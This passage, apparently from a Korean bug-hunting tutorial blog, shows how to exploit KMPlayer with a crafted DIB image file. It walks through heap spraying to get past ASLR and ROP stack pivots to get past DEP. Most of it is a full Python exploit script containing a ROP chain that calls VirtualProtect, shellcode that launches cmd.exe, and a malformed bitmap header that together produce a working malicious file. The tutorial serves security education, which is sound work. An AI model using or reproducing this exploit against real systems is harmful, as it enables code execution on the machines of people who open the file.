&lt;p&gt;&amp;#xC77C;&amp;#xB2E8; ASLR&amp;#xC740; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xB85C; &amp;#xC5B4;&amp;#xB290; &amp;#xC815;&amp;#xB3C4; &amp;#xCEE4;&amp;#xBC84;&amp;#xD558;&amp;#xC600;&amp;#xACE0; DEP&amp;#xB9CC; &amp;#xBB34;&amp;#xB825;&amp;#xD654;&amp;#xC2DC;&amp;#xD0A4;&amp;#xACE0; &amp;#xC258; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC791;&amp;#xC131;&amp;#xD558;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. DEP&amp;#xB97C; &amp;#xBB34;&amp;#xB825;&amp;#xD654;&amp;#xD558;&amp;#xB824;&amp;#xBA74; ROP&amp;#xB97C; &amp;#xD574;&amp;#xC57C;&amp;#xC8E0;!! &amp;#xC774;&amp;#xC81C; &lt;code&gt;esp&lt;/code&gt;&amp;#xB97C; &amp;#xC6B0;&amp;#xB9AC; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xC788;&amp;#xB294; &amp;#xD799; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xB85C; &amp;#xD53C;&amp;#xBD07; &amp;#xC2DC;&amp;#xD0AC; &amp;#xAC83;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC74C; &amp;#xC801;&amp;#xB2F9;&amp;#xD55C; &amp;#xAC00;&amp;#xC82F;&amp;#xC744; &amp;#xCC3E;&amp;#xC544;&amp;#xBCF4;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xC8E0;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x00523702&lt;/span&gt; : # PUSH ECX # POP ESP # POP ESI # POP EBX # RETN&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC77C;&amp;#xBD80;&amp;#xB85C; &amp;#xB450; &amp;#xBC88; &amp;#xB354; &lt;code&gt;POP&lt;/code&gt; &amp;#xD574;&amp;#xC8FC;&amp;#xB294; &amp;#xC774;&amp;#xC720;&amp;#xB294; &amp;#xC704;&amp;#xC5D0; &amp;#xBCF4;&amp;#xC2DC;&amp;#xB2E4;&amp;#xC2DC;&amp;#xD53C; &lt;code&gt;0x11111111&lt;/code&gt; &amp;#xBD80;&amp;#xBD84;&amp;#xC5D0; 8 &amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xAC00; &amp;#xB2E4;&amp;#xB978; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB85C; &amp;#xB36E;&amp;#xC5EC; &amp;#xC788;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC774; 8 &amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xB97C; &amp;#xB6F0;&amp;#xC5B4;&amp;#xB118;&amp;#xACE0; &amp;#xB9AC;&amp;#xD134;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD568;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC790; &amp;#xADF8;&amp;#xB7EC;&amp;#xBA74; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xB97C; &amp;#xC791;&amp;#xC131;&amp;#xD560; &amp;#xB54C; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xD558;&amp;#xBA74; &amp;#xB418;&amp;#xACA0;&amp;#xB124;&amp;#xC694;.&lt;/p&gt;
&lt;p&gt;&amp;#xC81C;&amp;#xC77C; &amp;#xCC98;&amp;#xC74C; &amp;#xBD80;&amp;#xBD84;&amp;#xC5D0;&amp;#xB294; &amp;#xC704; &amp;#xAC00;&amp;#xC82F;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xBC14;&amp;#xB85C; &amp;#xADF8; &amp;#xB4A4;&amp;#xC5D0;&amp;#xB294; &amp;#xB610; &amp;#xD53C;&amp;#xBD07; &amp;#xD558;&amp;#xB294; &amp;#xAC00;&amp;#xC82F;&amp;#xC744; &amp;#xB123;&amp;#xC5B4;&amp;#xC904; &amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xBC88;&amp;#xC5D0;&amp;#xB294; &amp;#xADF8;&amp;#xB0E5; &amp;#xD799;&amp;#xC5D0;&amp;#xC11C;&amp;#xB9CC;&amp;#xC694;. &amp;#xC65C;&amp;#xB0D0;&amp;#xD558;&amp;#xBA74; &amp;#xC774;&amp;#xBC88;&amp;#xC5D0;&amp;#xB294; &lt;code&gt;0x101cb056&lt;/code&gt; &amp;#xC5D0; &amp;#xB9E4;&amp;#xD551;&amp;#xC774; &amp;#xB418;&amp;#xC5C8;&amp;#xC9C0;&amp;#xB9CC; &amp;#xB2E4;&amp;#xC74C;&amp;#xC5D0; &amp;#xB610; &amp;#xC774; &amp;#xC5B8;&amp;#xC800;&amp;#xB9AC; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xB9E4;&amp;#xD551;&amp;#xB420; &amp;#xB54C;&amp;#xB3C4; &amp;#xC774; &amp;#xC8FC;&amp;#xC18C;&amp;#xB77C;&amp;#xB294; &amp;#xBCF4;&amp;#xC7A5;&amp;#xC774; &amp;#xC5C6;&amp;#xC73C;&amp;#xB2C8;&amp;#xAE50;&amp;#xC694;. &amp;#xCD5C;&amp;#xC18C;&amp;#xD55C; &amp;#xD558;&amp;#xC704; 2 &amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xB294; &amp;#xBC14;&amp;#xB00C;&amp;#xACA0;&amp;#xC8E0;. &amp;#xADF8;&amp;#xB807;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &lt;code&gt;esp&lt;/code&gt;&amp;#xB97C; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC5D0;&amp;#xC11C; &amp;#xD799;&amp;#xC73C;&amp;#xB85C;, &amp;#xB2E4;&amp;#xC2DC; &amp;#xD799;&amp;#xC5D0;&amp;#xC11C; &amp;#xB2E4; &amp;#xB192;&amp;#xC740; &amp;#xC8FC;&amp;#xC18C;&amp;#xC758; &amp;#xD799;&amp;#xC73C;&amp;#xB85C; &amp;#xD53C;&amp;#xBD07; &amp;#xD558;&amp;#xB294; &amp;#xAC00;&amp;#xC82F; &amp;#xB450; &amp;#xAC1C;&amp;#xB97C; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774; &amp;#xD574;&amp;#xC904; &amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD799;&amp;#xC5D0;&amp;#xC11C; &amp;#xD799;&amp;#xC73C;&amp;#xB85C; &amp;#xD53C;&amp;#xBD07; &amp;#xD558;&amp;#xB294; &amp;#xAC00;&amp;#xC82F;&amp;#xC740; &amp;#xC544;&amp;#xB798; &amp;#xAC78;&amp;#xB85C; &amp;#xC4F0;&amp;#xB3C4;&amp;#xB85D; &amp;#xD560;&amp;#xAC8C;&amp;#xC694;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x0095dffa&lt;/span&gt; : # ADD ESP,&lt;span class=&#34;hljs-number&#34;&gt;19010&lt;/span&gt; # POP EBP # POP EDI # POP ESI # POP EBX # RETN&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xC911;&amp;#xAC04;&amp;#xC911;&amp;#xAC04;&amp;#xC5D0; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC5D0;&amp;#xC11C; &amp;#xD799;&amp;#xC744; &amp;#xC4F0;&amp;#xB2E4;&amp;#xAC00; &amp;#xBC14;&amp;#xAFBC; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xB4E4;&amp;#xC744; &amp;#xC2A4;&amp;#xD0B5;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB3C4;&amp;#xB85D; &amp;#xC544;&amp;#xB798; &amp;#xAC00;&amp;#xC82F;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0x00433712&lt;/span&gt; : # POP EDX # POP EDI # POP ESI # POP EBX # RETN&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xC774;&amp;#xC81C; &amp;#xB192;&amp;#xC740; &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C; &amp;#xD53C;&amp;#xBD07; &amp;#xD588;&amp;#xC73C;&amp;#xBA74; &amp;#xADF8; &amp;#xBD80;&amp;#xBD84;&amp;#xC5D0;&amp;#xB3C4; &lt;code&gt;ret&lt;/code&gt;&amp;#xC73C;&amp;#xB85C; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xB97C; &amp;#xD574;&amp;#xC8FC;&amp;#xBA74; &amp;#xC880; &amp;#xB354; &amp;#xC815;&amp;#xD655;&amp;#xB3C4;&amp;#xAC00; &amp;#xB192;&amp;#xC544;&amp;#xC9C0;&amp;#xACA0;&amp;#xB124;&amp;#xC694; &amp;#x314E;&amp;#x314E;&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB7FC; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xAD6C;&amp;#xC131;&amp;#xD560; &amp;#xB54C;&amp;#xC5D0;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xD558;&amp;#xBA74; &amp;#xB418;&amp;#xACA0;&amp;#xB124;&amp;#xC694;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/Untitled.png&#34; alt=&#34;bughunting-tutorials-part4/Untitled.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC544;&amp;#xB798;&amp;#xB294; &amp;#xC81C;&amp;#xAC00; &amp;#xC791;&amp;#xC131;&amp;#xD55C; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xCF54;&amp;#xB4DC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; struct &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; pack, unpack
&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; collections &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; OrderedDict

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;create_rop_chain&lt;/span&gt;():&lt;/span&gt;
	&lt;span class=&#34;hljs-comment&#34;&gt;# rop chain generated with mona.py - www.corelan.be&lt;/span&gt;
	rop_gadgets = [
	&lt;span class=&#34;hljs-number&#34;&gt;0x00453c50&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# POP EDX # RETN [KMPlayer.exe]&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x00d6a848&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# ptr to &amp;amp;VirtualProtect() [IAT KMPlayer.exe]&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x0094eb72&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# MOV EAX,DWORD PTR DS:[EDX] # RETN [KMPlayer.exe]&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x007d2499&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# XCHG EAX,ESI # RETN [KMPlayer.exe]&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x00652cb0&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# POP EBP # RETN [KMPlayer.exe]&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x0042390c&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# &amp;amp; jmp esp [KMPlayer.exe]&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x004c0267&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# POP EBX # RETN [KMPlayer.exe]&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x00000201&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# 0x00000201-&amp;gt; ebx&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x0052d95d&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# POP EDX # RETN [KMPlayer.exe]&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x00000040&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# 0x00000040-&amp;gt; edx&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x0082f8e0&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# POP ECX # RETN [KMPlayer.exe]&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x00d0aafc&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# &amp;amp;Writable location [KMPlayer.exe]&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x009fc414&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# POP EDI # RETN [KMPlayer.exe]&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x00426485&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# RETN (ROP NOP) [KMPlayer.exe]&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x0068c402&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# POP EAX # RETN [KMPlayer.exe]&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x90909090&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# nop&lt;/span&gt;
	&lt;span class=&#34;hljs-number&#34;&gt;0x00744e56&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;# PUSHAD # RETN [KMPlayer.exe]&lt;/span&gt;
	]
	&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;&amp;apos;&lt;/span&gt;.join(pack(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;&amp;lt;I&amp;apos;&lt;/span&gt;, _) &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; _ &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; rop_gadgets)

&lt;span class=&#34;hljs-comment&#34;&gt;#shellcode for runnig cmd.exe&lt;/span&gt;
shellcode = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x90&amp;quot;&lt;/span&gt;*&lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\xda\xd2\xd9\x74\x24\xf4\x5d\x29\xc9\xba\xfb\xe4\x15&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\xba\xb1\x30\x31\x55\x17\x03\x55\x17\x83\x16\x18\xf7&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x4f\x14\x09\x7a\xaf\xe4\xca\x1b\x39\x01\xfb\x1b\x5d&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x42\xac\xab\x15\x06\x41\x47\x7b\xb2\xd2\x25\x54\xb5&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x53\x83\x82\xf8\x64\xb8\xf7\x9b\xe6\xc3\x2b\x7b\xd6&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x0b\x3e\x7a\x1f\x71\xb3\x2e\xc8\xfd\x66\xde\x7d\x4b&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\xbb\x55\xcd\x5d\xbb\x8a\x86\x5c\xea\x1d\x9c\x06\x2c&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x9c\x71\x33\x65\x86\x96\x7e\x3f\x3d\x6c\xf4\xbe\x97&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\xbc\xf5\x6d\xd6\x70\x04\x6f\x1f\xb6\xf7\x1a\x69\xc4&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x8a\x1c\xae\xb6\x50\xa8\x34\x10\x12\x0a\x90\xa0\xf7&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\xcd\x53\xae\xbc\x9a\x3b\xb3\x43\x4e\x30\xcf\xc8\x71&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x96\x59\x8a\x55\x32\x01\x48\xf7\x63\xef\x3f\x08\x73&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x50\x9f\xac\xf8\x7d\xf4\xdc\xa3\xeb\x0b\x52\xde\x5e&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x0b\x6c\xe0\xce\x64\x5d\x6b\x81\xf3\x62\xbe\xe5\x0c&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x29\xe2\x4c\x85\xf4\x77\xcd\xc8\x06\xa2\x12\xf5\x84&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x46\xeb\x02\x94\x23\xee\x4f\x12\xd8\x82\xc0\xf7\xde&amp;quot;&lt;/span&gt;
shellcode += &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\x31\xe0\xdd\xbd\xd8\x7a\xde&amp;quot;&lt;/span&gt;

p = &lt;span class=&#34;hljs-keyword&#34;&gt;lambda&lt;/span&gt; x : pack(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;L&amp;quot;&lt;/span&gt;, x)
up = &lt;span class=&#34;hljs-keyword&#34;&gt;lambda&lt;/span&gt; x : unpack(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;L&amp;quot;&lt;/span&gt;, x)[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;]

rop_chain = create_rop_chain()

BITMAPFILEHEADER = OrderedDict()
BITMAPINFOHEADER = OrderedDict()

BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biSize&amp;apos;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\x28\x1f\x00\x00&amp;apos;&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;# origin is 0x28&lt;/span&gt;
BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biWidth&amp;apos;&lt;/span&gt;] = p(&lt;span class=&#34;hljs-number&#34;&gt;0x1c48&lt;/span&gt;)
BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biHeight&amp;apos;&lt;/span&gt;] = p(&lt;span class=&#34;hljs-number&#34;&gt;0x1c48&lt;/span&gt;)
BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biPlanes&amp;apos;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\x01\x00&amp;apos;&lt;/span&gt;
BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biBitCount&amp;apos;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\x18\x00&amp;apos;&lt;/span&gt;
BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biCompression&amp;apos;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\x00\x0a\x00\x00&amp;apos;&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;# origin is 0x00&lt;/span&gt;
BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biSizeImage&amp;apos;&lt;/span&gt;] = p(&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * (up(BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biWidth&amp;apos;&lt;/span&gt;]) *
up(BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biHeight&amp;apos;&lt;/span&gt;])))
BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biXPelsPerMeter&amp;apos;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\x00\x00\x00\x00&amp;apos;&lt;/span&gt;
BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biYPelsPerMeter&amp;apos;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\x00\x00\x00\x00&amp;apos;&lt;/span&gt;
BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biClrUsed&amp;apos;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\x00\x02\x00\x00&amp;apos;&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;# origin is 0x00&lt;/span&gt;
BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biClrImportant&amp;apos;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\x00\x00\x00\x00&amp;apos;&lt;/span&gt;

BITMAPFILEHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;bfType&amp;apos;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;BM&amp;apos;&lt;/span&gt;
BITMAPFILEHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;bfsize&amp;apos;&lt;/span&gt;] = p(up(BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biSizeImage&amp;apos;&lt;/span&gt;]) + &lt;span class=&#34;hljs-number&#34;&gt;0x36&lt;/span&gt;)
BITMAPFILEHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;bfReserved1&amp;apos;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\x00\x00&amp;apos;&lt;/span&gt;
BITMAPFILEHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;bfReserved2&amp;apos;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\x00\x00&amp;apos;&lt;/span&gt;
BITMAPFILEHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;bfOffBits&amp;apos;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\x36\x00\x00\x00&amp;apos;&lt;/span&gt;

head = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Fandu_&amp;apos;&lt;/span&gt;
tail = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;FANDU_&amp;apos;&lt;/span&gt;
spray = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\x11&amp;apos;&lt;/span&gt;
stack_to_heap = p(&lt;span class=&#34;hljs-number&#34;&gt;0x00523702&lt;/span&gt;) &lt;span class=&#34;hljs-comment&#34;&gt;# PUSH ECX # POP ESP # POP ESI # POP EBX # RETN&lt;/span&gt;
heap_to_heap = p(&lt;span class=&#34;hljs-number&#34;&gt;0x0095ddef&lt;/span&gt;) &lt;span class=&#34;hljs-comment&#34;&gt;# ADD ESP,19000 # POP EDI # POP ESI # POP EBX # RETN&lt;/span&gt;
pivot = p(&lt;span class=&#34;hljs-number&#34;&gt;0x00433712&lt;/span&gt;) &lt;span class=&#34;hljs-comment&#34;&gt;# POP EDX # POP EDI # POP ESI # POP EBX # RETN&lt;/span&gt;
ret = p(&lt;span class=&#34;hljs-number&#34;&gt;0x00984e94&lt;/span&gt;) &lt;span class=&#34;hljs-comment&#34;&gt;# RETN&lt;/span&gt;
offset1 = &lt;span class=&#34;hljs-number&#34;&gt;0x11111111&lt;/span&gt; - &lt;span class=&#34;hljs-number&#34;&gt;0x101cb056&lt;/span&gt; - &lt;span class=&#34;hljs-number&#34;&gt;0x600000&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;# for calculating size of 0x11 spray&lt;/span&gt;
offset2 = &lt;span class=&#34;hljs-number&#34;&gt;0x197c0d11&lt;/span&gt; - &lt;span class=&#34;hljs-number&#34;&gt;0x173772e1&lt;/span&gt; - &lt;span class=&#34;hljs-number&#34;&gt;0x100000&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;# for skip some data which are mutated&lt;/span&gt;

payload = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;&amp;apos;&lt;/span&gt;
payload += head +&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;aa&amp;apos;&lt;/span&gt;
payload += spray * offset1
payload += (heap_to_heap + stack_to_heap) * (&lt;span class=&#34;hljs-number&#34;&gt;0x400000&lt;/span&gt; * &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt; / &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;)
payload += pivot * ((up(BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biSizeImage&amp;apos;&lt;/span&gt;]) - len(payload) - offset2 - &lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt; - len(tail)) / &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;)
payload += ret * (&lt;span class=&#34;hljs-number&#34;&gt;0x20000&lt;/span&gt; / &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;)
payload += rop_chain
payload += shellcode
payload += spray * (up(BITMAPINFOHEADER[&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;biSizeImage&amp;apos;&lt;/span&gt;]) - len(payload)) &lt;span class=&#34;hljs-comment&#34;&gt;#dummy&lt;/span&gt;
payload += tail

exploit = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;&amp;apos;&lt;/span&gt;

&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; key &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; BITMAPFILEHEADER.keys() :
	exploit += BITMAPFILEHEADER[key]

&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; key &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; BITMAPINFOHEADER.keys() :
	exploit += BITMAPINFOHEADER[key]

exploit += payload

f = open(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;./exploit.dib&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;wb&amp;apos;&lt;/span&gt;)
f.write(exploit)
f.close()&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xC774; &amp;#xD30C;&amp;#xC774;&amp;#xC36C; &amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xC2DC;&amp;#xCF1C; &amp;#xB5A8;&amp;#xAD88;&amp;#xC9C4; &lt;code&gt;exploit.dib&lt;/code&gt; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; KMPlayer&amp;#xC5D0; &amp;#xB123;&amp;#xC5B4; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xBA74;!!!!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--076.png&#34; alt=&#34;bughunting-tutorials-part4/image--076.png&#34;&gt;&lt;/p&gt;
